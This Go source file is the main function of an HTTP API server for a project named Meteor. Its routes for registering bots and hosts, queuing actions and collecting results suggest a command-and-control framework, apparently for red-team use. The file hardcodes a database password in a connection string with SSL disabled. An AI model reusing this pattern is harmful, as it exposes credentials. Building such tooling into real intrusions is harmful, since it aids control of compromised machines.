package main

import (
	"context"
	"fmt"
	"github.com/degenerat3/meteor/meteor/core/ent"
	"log"
	"net/http"
	"os"
)

var (
	// CORESERVER is the IP:Port of the Meteor core
	CORESERVER = os.Getenv("CORE_SERVER") // format: 9.9.9.9:9999

	// DBClient is the connector to the postgres db
	DBClient *ent.Client

	ctx = context.Background()
)

func main() {
	var err error
	DBClient, err = ent.Open("postgres", "host=172.16.77.3 port=5432 user=met dbname=meteor password=dbpassword sslmode=disable")
	if err != nil {
		fmt.Printf("Error connecting to DB: %v\n", err.Error())
	}

	initAdmin()

	http.HandleFunc("/", status)
	http.HandleFunc("/status", status)
	http.HandleFunc("/login", userLogin)
	http.HandleFunc("/refresh", refresh)
	http.HandleFunc("/register/bot", forwardReq)
	http.HandleFunc("/register/host", forwardReq)
	http.HandleFunc("/register/group", forwardReq)
	http.HandleFunc("/register/hostgroup", forwardReq)
	http.HandleFunc("/register/user", registerUser)
	http.HandleFunc("/add/action/single", forwardReq)
	http.HandleFunc("/add/action/group", forwardReq)
	http.HandleFunc("/add/result", forwardReq)
	http.HandleFunc("/list/result", forwardReq)
	http.HandleFunc("/list/bots", listForward)
	http.HandleFunc("/list/hosts", listForward)
	http.HandleFunc("/list/groups", listForward)
	http.HandleFunc("/list/actions", listForward)
	log.Fatal(http.ListenAndServe(":8888", nil))
	return
}
